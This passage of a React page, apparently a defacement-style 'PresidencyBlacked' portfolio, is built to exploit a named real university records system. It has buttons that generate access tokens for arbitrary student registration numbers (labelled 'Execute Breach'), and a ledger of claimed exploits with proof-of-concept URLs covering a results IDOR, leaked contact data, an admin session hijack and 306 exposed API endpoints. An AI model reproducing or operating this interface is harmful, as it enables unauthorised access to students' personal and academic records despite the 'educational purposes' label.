                        <div key={key} className={`group transition-all ${sensitive ? 'p-6 rounded-xl bg-[#ff4d4d]/25 border border-[#ff4d4d] shadow-[0_0_20px_rgba(255,77,77,0.2)]' : 'border-b border-white/30 pb-4'}`}>
                          <div className="flex justify-between items-start mb-2">
                            <span className={`label text-[10px] font-bold tracking-widest ${sensitive ? 'text-[#ff4d4d] opacity-100' : 'opacity-90'}`}>
                              {formatLabel(key)}
                            </span>
                          </div>
                          <div className={`text-lg break-words font-medium tracking-tight ${sensitive ? 'text-white' : 'text-white'} ${displayValue === 'NULL' ? 'text-white/40 font-mono italic' : ''}`}>
                            {displayValue}
                          </div>
                        </div>
                      );
                    })}
                </div>
              </div>
            </div>
          )}
        </div>
      )}


      {/* Website Links Section */}
      <div className="w-full max-w-6xl mb-16">
        <div className="flex items-center gap-4 mb-10">
          <h2 className="text-3xl md:text-5xl font-black uppercase tracking-tighter italic">
            Website<span className="text-[#00ff00]">_Links</span>
          </h2>
          <div className="h-[1px] flex-1 bg-white/20"></div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          {/* Base Website Link */}
          <a 
            href="https://coe.pgi-intraconnect.in/pubapi/app.php" 
            target="_blank" 
            rel="noopener noreferrer"
            className="glass-panel p-8 border-t-4 border-t-[#00ff00] hover:translate-y-[-4px] transition-all group"
          >
            <div className="flex justify-between items-start mb-6">
              <span className="font-mono text-[10px] bg-white/20 px-2 py-0.5 rounded text-white/80">LINK_001</span>
              <span className="text-[9px] font-black px-2 py-0.5 rounded bg-[#00ff00] text-black">STABLE</span>
            </div>
            <h3 className="text-xl font-black uppercase mb-2 italic group-hover:text-[#00ff00] transition-colors">PUB_API_HOME</h3>
            <p className="text-[11px] font-mono text-white/60 mb-6">Direct access to the public API root endpoint.</p>
            <div className="bg-black/80 p-3 rounded-lg font-mono text-[10px] text-[#00ff00] border border-white/25 break-all">
              coe.pgi-intraconnect.in/pubapi/app.php
            </div>
          </a>

          {/* Generate Token New */}
          <div 
            onClick={() => handlePubApiQuery('genrateTokennew')}
            className="glass-panel p-8 border-t-4 border-t-[#00ff00] hover:translate-y-[-4px] transition-all cursor-pointer group"
          >
            <div className="flex justify-between items-start mb-6">
              <span className="font-mono text-[10px] bg-white/20 px-2 py-0.5 rounded text-white/80">EXEC_001</span>
              <span className="text-[9px] font-black px-2 py-0.5 rounded bg-[#00ff00] text-black">FUNCTION</span>
            </div>
            <h3 className="text-xl font-black uppercase mb-2 italic group-hover:text-[#00ff00] transition-colors">GEN_TOKEN_NEW</h3>
            <p className="text-[11px] font-mono text-white/60 mb-6">Generate a fresh system token for audit sessions.</p>
            <div className="bg-black/80 p-3 rounded-lg font-mono text-[10px] text-[#00ff00] border border-white/25 break-all">
              [INITIATE_FUNCTION_CALL]
            </div>
          </div>

          {/* Generate Token with RegNo */}
          <div className="glass-panel p-8 border-t-4 border-t-[#00ff00] hover:translate-y-[-4px] transition-all group">
            <div className="flex justify-between items-start mb-6">
              <span className="font-mono text-[10px] bg-white/20 px-2 py-0.5 rounded text-white/80">EXEC_002</span>
              <span className="text-[9px] font-black px-2 py-0.5 rounded bg-[#00ff00] text-black">DYNAMIC</span>
            </div>
            <h3 className="text-xl font-black uppercase mb-2 italic group-hover:text-[#00ff00] transition-colors">GEN_TOKEN_REG</h3>
            <div className="flex flex-col gap-3 mb-4">
              <input 
                type="text"
                value={userRegNo}
                onChange={(e) => setUserRegNo(e.target.value)}
                placeholder="REG_NO"
                className="w-full bg-black/50 border border-white/20 p-2 rounded font-mono text-[10px] tracking-widest focus:border-[#00ff00] focus:outline-none transition-all"
              />
              <button 
                onClick={() => handlePubApiQuery('genrateToken', { univcode: '064', regno: userRegNo })}
                className="w-full bg-[#00ff00]/10 border border-[#00ff00]/40 py-2 rounded font-mono text-[10px] text-[#00ff00] hover:bg-[#00ff00] hover:text-black transition-all uppercase tracking-widest font-black"
              >
                Execute Breach
              </button>
            </div>
            <p className="text-[11px] font-mono text-white/60">Generate targeted token using registration mapping.</p>
          </div>
        </div>
      </div>

      {/* Security Audit Ledger */}
      <div className="w-full max-w-6xl mb-16">
        <div className="flex items-center gap-4 mb-10">
          <h2 className="text-3xl md:text-5xl font-black uppercase tracking-tighter italic">
            Security_Audit<span className="text-[#ff4d4d]">_Ledger</span>
          </h2>
          <div className="h-[1px] flex-1 bg-white/20"></div>
          <span className="text-[12px] font-mono opacity-60">VERIFIED_EXPLOITS: 04</span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
          {[
            { id: "0x0A2", title: "Results IDOR", poc: "https://coe.pgi-intraconnect.in/#/result", desc: "Unauthorized access to comprehensive academic records." },
            { id: "0x0BC", title: "Linways PII", poc: ".../attendance-report?redir=true", desc: "Broken Access Control allows retrieval of private contact info." },
            { id: "0x0FF", title: "Admin Hijack", poc: "https://dvs1.pgi-intraconnect.in/#/admin", desc: "Dashboard access achieved through session manipulation." },
            { id: "0x1A4", title: "Mass Endpoint Leak", poc: "/api/teacher?action=...", desc: "Discovery of 306 undocumented backend API endpoints with broken access controls." }
          ].map((bug) => (
            <div key={bug.id} className="glass-panel p-8 border-t-4 border-t-[#ff4d4d] hover:translate-y-[-4px] transition-all">
              <div className="flex justify-between items-start mb-6">
                <span className="font-mono text-[10px] bg-white/20 px-2 py-0.5 rounded text-white/80">{bug.id}</span>
                <span className="text-[9px] font-black px-2 py-0.5 rounded bg-[#ff4d4d] text-black">CRITICAL</span>
              </div>
              <h3 className="text-xl font-black uppercase mb-2 italic">{bug.title}</h3>
              <p className="text-[11px] font-mono text-white/60 mb-6">{bug.desc}</p>
              <div className="bg-black/80 p-3 rounded-lg font-mono text-[10px] text-[#00ff00] border border-white/25 break-all">{bug.poc}</div>
            </div>
          ))}
        </div>
      </div>

      <footer className="mt-16 text-white/40 text-[10px] uppercase tracking-widest font-mono">
        © 2026 PresidencyBlacked // Transparency Portfolio // Educational Purposes Only
      </footer>

      {/* Swipe Toggle Button */}
      <div className="fixed bottom-8 right-8 z-[100] flex items-center gap-3 animate-in fade-in slide-in-from-right-8 duration-1000">
        <span className={`font-mono text-[10px] uppercase tracking-widest transition-opacity duration-500 ${showMascots ? 'text-[#00ff00]' : 'text-white/60'}`}>
          {showMascots ? 'Mascots Active' : 'Hidden Mascots'}
        </span>
        <button 
          onClick={() => setShowMascots(!showMascots)}
          className={`group relative w-16 h-8 rounded-full transition-all duration-500 border-2 cursor-pointer ${showMascots ? 'bg-[#00ff00]/10 border-[#00ff00] shadow-[0_0_20px_rgba(0,255,0,0.3)]' : 'bg-white/5 border-white/20'}`}
        >
          <div className={`absolute top-1 left-1 w-5 h-5 rounded-full transition-all duration-500 transform flex items-center justify-center ${showMascots ? 'translate-x-8 bg-[#00ff00]' : 'translate-x-0 bg-white/20'}`}>
            <div className={`w-2 h-2 rounded-full ${showMascots ? 'bg-black' : 'bg-white/40'}`}></div>
          </div>
          {/* Subtle swipe track line */}
          <div className="absolute inset-0 flex items-center justify-center pointer-events-none opacity-10">
            <div className="w-10 h-[1px] bg-white"></div>
          </div>
        </button>
      </div>
    </main>
  );
}
